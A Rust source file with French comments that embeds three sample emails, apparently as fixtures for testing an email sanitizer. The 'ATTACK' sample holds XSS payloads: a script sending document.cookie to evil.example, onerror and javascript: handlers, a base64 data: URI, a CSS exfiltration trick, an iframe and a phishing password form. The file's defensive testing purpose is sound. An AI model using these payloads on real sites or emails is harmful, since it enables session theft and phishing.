//! Corpus embarqué pour le mode `--sample` (aucun credential nécessaire) :
//! une newsletter à tableaux, une tentative d'attaque, un email simple.

pub const SAMPLES: [&str; 3] = [NEWSLETTER, ATTACK, SIMPLE];

const NEWSLETTER: &str = "From: La Gazette <news@example.com>\r\n\
Subject: =?UTF-8?Q?Les_nouveaut=C3=A9s_de_l'=C3=A9t=C3=A9?=\r\n\
Content-Type: text/html; charset=utf-8\r\n\
\r\n\
<html><body style=\"margin:0;background:#eeeeee\">\
<table width=\"600\" align=\"center\" bgcolor=\"#ffffff\" cellpadding=\"0\" cellspacing=\"0\">\
<tr><td align=\"center\" style=\"padding:24px;background-image:url('https://cdn.example.com/hero.jpg');background-color:#1a73e8\">\
<h1 style=\"color:#ffffff;font-family:Arial\">La Gazette</h1></td></tr>\
<tr><td style=\"padding:24px;font-family:Georgia;color:#333333\">\
<p>Bonjour, voici les nouveaut&eacute;s de l'&eacute;t&eacute; &mdash; tableaux imbriqu&eacute;s, styles inline et images distantes.</p>\
<img src=\"https://cdn.example.com/photo.jpg\" width=\"552\" height=\"200\" alt=\"Photo\">\
<img src=\"https://tracker.example.com/open.gif\" width=\"1\" height=\"1\" alt=\"\">\
<table width=\"100%\"><tr>\
<td width=\"50%\" style=\"padding:8px;border:1px solid #dddddd\"><b>Colonne 1</b><br>Texte</td>\
<td width=\"50%\" style=\"padding:8px;border:1px solid #dddddd\"><b>Colonne 2</b><br>Texte</td>\
</tr></table>\
<p><a href=\"https://example.com/lire\" style=\"color:#1a73e8\">Lire en ligne</a></p>\
</td></tr></table></body></html>";

const ATTACK: &str = "From: Mallory <mallory@evil.example>\r\n\
Subject: Facture urgente (piege XSS)\r\n\
Content-Type: text/html; charset=utf-8\r\n\
\r\n\
<html><body>\
<p>Votre facture est disponible.</p>\
<script>document.location='https://evil.example/steal?c='+document.cookie</script>\
<img src=\"https://evil.example/x.png\" onerror=\"alert('xss')\">\
<a href=\"javascript:alert('xss')\">Voir la facture</a>\
<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Ouvrir</a>\
<div style=\"background:u\rl(https://evil.example/css-exfil);width:100px\">contenu</div>\
<iframe src=\"https://evil.example/frame\"></iframe>\
<form action=\"https://evil.example/phish\"><input name=\"mdp\" type=\"password\"></form>\
</body></html>";

const SIMPLE: &str = "From: =?UTF-8?Q?S=C3=A9bastien?= <seb@example.com>\r\n\
Subject: =?UTF-8?Q?R=C3=A9union_de_demain?=\r\n\
Content-Type: text/plain; charset=utf-8\r\n\
\r\n\
Bonjour,\r\n\r\nOn se voit demain a 10 h ? <ce chevron doit rester du texte>\r\n\r\nSeb";
